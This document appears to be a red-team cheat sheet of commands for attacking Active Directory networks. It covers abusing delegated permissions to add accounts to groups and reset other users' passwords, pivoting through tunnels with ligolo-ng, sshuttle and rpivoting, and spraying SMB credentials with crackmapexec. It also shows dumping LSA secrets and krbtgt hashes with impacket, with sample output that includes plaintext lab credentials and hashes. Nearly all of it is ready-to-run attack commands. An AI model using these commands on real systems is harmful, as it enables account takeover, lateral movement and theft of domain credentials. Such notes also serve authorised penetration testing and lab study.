

#AD Exploit Permission Delegation
+ ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
+ AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
+ GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
+ GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
+ WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
+ WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
+ AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

	PS C:\>Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
	PS C:\>Get-ADGroupMember -Identity "IT Support" -> you will see your account added to gropu IT Support
	****** ForceChangePassword
	PS C:\>Get-ADGroupMember -Identity "Tier 2 Admins" -> find user interest to resent their password
 	
	PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
	PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password

	***** Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run gpupdate /force and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.

  	HTTP - Used for web applications to allow pass-through authentication using AD credentials.
CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
HOST - Allows delegation of account for all activities on the host.
MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.
    
# Pivoting

Sshuttle Command:

	sshuttle -r user@remote_host:2222 192.168.98.0/24 
	sshuttle -r user@remote_host 192.168.98.0/24 

	192.168.98.0/24 -> get from check ifconfig when see 2 adapter
	
	after shuttle
	
	nmap -sC -sV 192.168.98.5 -> IP for Pivoting

ligolo-ng

	#Attacker Machine, download proxy & agent :
	
	#Proxy
	wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
	tar -xvzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

	#Agent
	wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
	tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

	Setup the ligolo-ng proxy in the attacker machine & ligolo-ng in the victim machine.

	# Attacker Machine
	sudo ip tuntap add user kali mode tun ligolo

	#Delete the 192.168.98.0/24 IP Range from the tun0 interface :
	sudo ip route del 192.168.98.0/24 dev tun0
	#Up the ligolo interface :
	sudo ip link set ligolo up
	#Add 192.168.98.0/24 IP range to the ligolo interface :
	sudo ip route add 192.168.98.0/24 dev ligolo

	Confirm the route on your attacker machine.

	ip route

	Start the proxy on the attacker server
	./proxy -selfcert -laddr 0.0.0.0:443

	Transfer the agent on the victim machine & start the connection
	#Replace this with your attacker IP address.
	./agent -connect 10.10.200.X:443 -ignore-cert

	session
	list_tunnels
	start

SSH Pivoting

	ssh -D 8088 privilege@192.168.80.10
	netstat -ano | grep 8088

rpivoting

	+ attacker set up
 		-check python2 availble 
		python2 server.py --server-port 9980 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
	 	ifconfig -> copy this ip to victim
   
  	+ victim set up
  	
		copy rpivoting to victim client 
		python2 client.py --server-ip 10.10.200.124 --server-port 9980


# Firefox Find Information

	ls -la .mozilla/
	cd .mozilla/firefox/
	# The filename may vary on your infrastructure, identify & use accordingly
	cd b2rri1qd.default-release
	
	sqlite3 places.sqlite
	.tables
	select * from moz_bookmarks;

# SMB

SMB Bruteforce IP List with one username and password

	for i in 2 15 30 120; do crackmapexec smb "192.168.98.$i" -u "john" -p "User1@#$%6" ; done

SMB check information 

	crackmapexec smb 192.168.98.2

	for i in 2 15 30 120; do crackmapexec smb "192.168.98.$i" sleep 10; done

SMB LSA 

	crackmapexec smb 192.168.98.30 -u john -p User1@#$%6 --lsa

	Output: 
		SMB         192.168.98.30   445    MGMT             			corpmngr@child.warfare.corp:User4&*&*

# Impacket tools

**Install Impacket In kali**

	sudo apt install python3-impacket

**Dumping user Krbtgt**

	impacket-secretsdump -debug child/corpmngr:"User4&*&*"@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'

	Result:
	[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=child,DC=warfare,DC=corp
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
	krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
	krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
	krbtgt:des-cbc-md5:ba0b49b6b6455885

# Remote login with exec
	impacket-smbexec corpmngr:"User4&*&*"@192.168.98.120

# Loop Net User /DOM
	for %u in (t2_alan.riley t2_caroline.dawson t2_henry.harvey t2_henry.shaw t2_irene.nash t2_jordan.hawkins t2_june.russell t2_kathleen.mills t2_lawrence.lewis t2_leon.francis t2_melanie.davies t2_robin.wyatt t2_ross.bird) do @echo ==== %u ==== && net user "%u" /domain && echo.


# RedTeam-CheckSheet
